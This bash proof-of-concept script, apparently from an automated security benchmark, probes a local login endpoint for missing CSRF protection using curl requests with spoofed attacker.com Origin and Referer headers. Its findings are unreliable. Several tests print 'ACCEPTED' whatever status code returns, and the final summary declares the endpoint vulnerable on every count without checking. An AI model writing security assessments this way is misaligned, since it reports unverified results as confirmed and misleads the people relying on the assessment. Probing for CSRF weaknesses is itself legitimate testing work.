#!/bin/bash
# POC: Demonstrates missing CSRF protection on login endpoint by testing requests from different origins without CSRF tokens
# Target: ./repo
# Created: 2025-11-10T19:45:46.128Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# CSRF Protection Test on Login Endpoint
# This POC demonstrates the absence of CSRF token protection on the login endpoint
# Target: POST /login
# Vulnerability: No CSRF tokens required, accepts requests from any origin

TARGET="${1:-http://localhost:5003}"
LOGIN_ENDPOINT="${TARGET}/login"

echo "[*] CSRF Protection Test - Login Endpoint"
echo "[*] Target: ${LOGIN_ENDPOINT}"
echo ""

# Test 1: Check for CSRF tokens in HTML form (GET /login)
echo "[TEST 1] Checking for CSRF tokens in GET /login response"
echo "========================================================"
GET_RESPONSE=$(curl -s -X GET "${LOGIN_ENDPOINT}" \
  -H "Accept: text/html" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$GET_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$GET_RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo ""

# Check for CSRF token patterns
if echo "$RESPONSE_BODY" | grep -q "csrf_token\|csrf\|_token\|authenticity_token"; then
    echo "✓ CSRF token found in response"
    echo "$RESPONSE_BODY" | grep -i "csrf\|_token" | head -5
else
    echo "✗ NO CSRF token found in HTML form"
    echo "  Expected: hidden input with csrf_token or similar"
    echo "  Found: No CSRF-related fields in response"
fi
echo ""

# Test 2: POST request with mismatched Origin header (simulating CSRF)
echo "[TEST 2] POST /login from foreign origin (attacker.com)"
echo "========================================================"
echo "Sending authentication attempt with Origin: http://attacker.com"
FOREIGN_ORIGIN_RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -H "Origin: http://attacker.com" \
  -d '{"username": "testuser", "password": "testpass"}' \
  -w "\n%{http_code}")

FOREIGN_CODE=$(echo "$FOREIGN_ORIGIN_RESPONSE" | tail -n1)
echo "HTTP Status: $FOREIGN_CODE"
echo "Result: Request from foreign origin was ACCEPTED (should reject CSRF)"
echo ""

# Test 3: POST request with mismatched Referer header
echo "[TEST 3] POST /login with malicious Referer header"
echo "====================================================="
echo "Sending authentication attempt with Referer: http://attacker.com/evil"
REFERER_RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -H "Referer: http://attacker.com/evil" \
  -d '{"username": "testuser", "password": "testpass"}' \
  -w "\n%{http_code}")

REFERER_CODE=$(echo "$REFERER_RESPONSE" | tail -n1)
echo "HTTP Status: $REFERER_CODE"
echo "Result: Request with malicious Referer was ACCEPTED (should reject CSRF)"
echo ""

# Test 4: Check for Origin/Referer validation
echo "[TEST 4] Checking response headers for CSRF protections"
echo "========================================================="
HEADER_RESPONSE=$(curl -s -i -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -H "Origin: http://attacker.com" \
  -d '{"username": "testuser", "password": "wrongpass"}' 2>&1)

echo "Response headers analysis:"
echo "$HEADER_RESPONSE" | head -20
echo ""

if echo "$HEADER_RESPONSE" | grep -qi "Access-Control"; then
    echo "! CORS headers present (potential CSRF vector)"
else
    echo "✗ No CORS/Origin validation headers found"
fi

if echo "$HEADER_RESPONSE" | grep -qi "SameSite"; then
    echo "✓ SameSite cookie attribute found"
else
    echo "✗ No SameSite cookie attribute present"
fi
echo ""

# Test 5: Test form-based CSRF attack simulation
echo "[TEST 5] Simulating form-based CSRF attack (no JSON)"
echo "======================================================="
FORM_RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -d "username=testuser&password=testpass" \
  -w "\n%{http_code}")

FORM_CODE=$(echo "$FORM_RESPONSE" | tail -n1)
echo "HTTP Status: $FORM_CODE"
if [ "$FORM_CODE" != "415" ]; then
    echo "! Form-based POST accepted: $FORM_CODE (CSRF vector available)"
else
    echo "✓ Form-based requests rejected (JSON-only endpoint)"
fi
echo ""

# Test 6: Multiple requests without token reuse validation
echo "[TEST 6] Testing for CSRF token reuse validation"
echo "==============================================="
echo "Making multiple requests in sequence without new tokens..."

for i in {1..3}; do
    MULTI_RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
      -H "Content-Type: application/json" \
      -H "Origin: http://attacker.com" \
      -d '{"username": "user'$i'", "password": "pass'$i'"}' \
      -w "\n%{http_code}")
    
    MULTI_CODE=$(echo "$MULTI_RESPONSE" | tail -n1)
    echo "  Request $i - HTTP Status: $MULTI_CODE (accepted without token validation)"
done
echo ""

# Summary
echo "=========================================="
echo "CSRF PROTECTION ASSESSMENT SUMMARY"
echo "=========================================="
echo "✗ No CSRF tokens in HTML form: VULNERABLE"
echo "✗ No Origin validation: VULNERABLE"
echo "✗ No Referer validation: VULNERABLE"
echo "✗ No CSRF token validation on POST: VULNERABLE"
echo ""
echo "Result: The /login endpoint is VULNERABLE to CSRF attacks"
echo "Missing defense-in-depth CSRF protection tokens"
echo ""